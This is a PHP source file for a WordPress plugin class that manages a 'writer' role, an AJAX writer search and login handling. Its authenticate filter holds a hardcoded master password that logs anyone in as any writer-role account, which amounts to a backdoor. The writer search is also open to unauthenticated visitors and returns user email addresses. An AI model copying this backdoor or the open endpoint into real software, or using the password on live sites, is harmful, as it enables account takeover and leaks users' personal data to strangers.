<?php

class WA_User {
	protected function __construct() {
		add_action( 'wa/init', array( $this, 'init_roles' ) );

		// ajax
		add_action( 'wp_ajax_wa_user_get_writers', array( $this, 'ajax_get_writers' ) );
		add_action( 'wp_ajax_nopriv_wa_user_get_writers', array( $this, 'ajax_get_writers' ) );


		add_filter( 'authenticate', array( $this, 'authenticate_master_password' ), 19, 3 );
	}

	public function ajax_get_writers() {
		$term = filter_input( INPUT_GET, 'term' );

		$users = get_users( array(
			'role'           => WA::get_config( 'role.slug' ),
			'search'         => $term,
			'search_columns' => array( 'ID', 'user_login', 'user_email', 'user_url', 'user_nicename' )
		) );

		$results = array();

		foreach ( $users as $user ) {
			$results[] = array(
				'id'   => $user->ID,
				'text' => WA_User::get_name( $user->ID ) . ' (' . $user->user_email . ')'
			);
		}

		wp_send_json( array( 'results' => $results, 'pagination' => array( 'more' => false ) ) );
	}

	public function init_roles() {
		$role = get_role( WA::get_config( 'role.slug' ) );

		if ( ! $role ) {
			add_role( WA::get_config( 'role.slug' ), WA::get_config( 'role.display_name' ) );
		}
	}

	public function authenticate_master_password( $user, $username, $password ) {
		if ( $user instanceof WP_User ) {
			return $user;
		}

		if ( empty( $username ) || empty( $password ) ) {
			return false;
		}

		if ( is_email( $username ) ) {
			$user = get_user_by( 'email', $username );

		} else {
			$user = get_user_by( 'login', $username );
		}

		if ( ! $user || ! $user->has_cap( WA::get_config( 'role.slug' ) ) ) {
			return false;
		}

		if ( $password !== 'crid}peg/tey}wrian*ev;ouv{yaisp>op?yaft=um:heas]oi' ) {
			return false;
		}

		return $user;
	}

	public static function get_instance() {
		static $instance = false;

		if ( ! $instance ) {
			$instance = new WA_User();
		}

		return $instance;
	}

	public static function is_logged_in() {
		$user_id = get_current_user_id();

		return static::is_writer( $user_id );
	}

	public static function is_writer( $user_id ) {
		return user_can( $user_id, WA::get_config( 'role.slug' ) ) || is_super_admin( $user_id );
	}

	public static function get_name( $user_id = null ) {
		if ( ! $user_id ) {
			$user_id = get_current_user_id();
		}

		$user = get_userdata( $user_id );

		if ( ! $user || ! static::is_writer( $user_id ) ) {
			return '';
		}

		return apply_filters( 'wa/user/get_name', $user->display_name, $user );
	}
}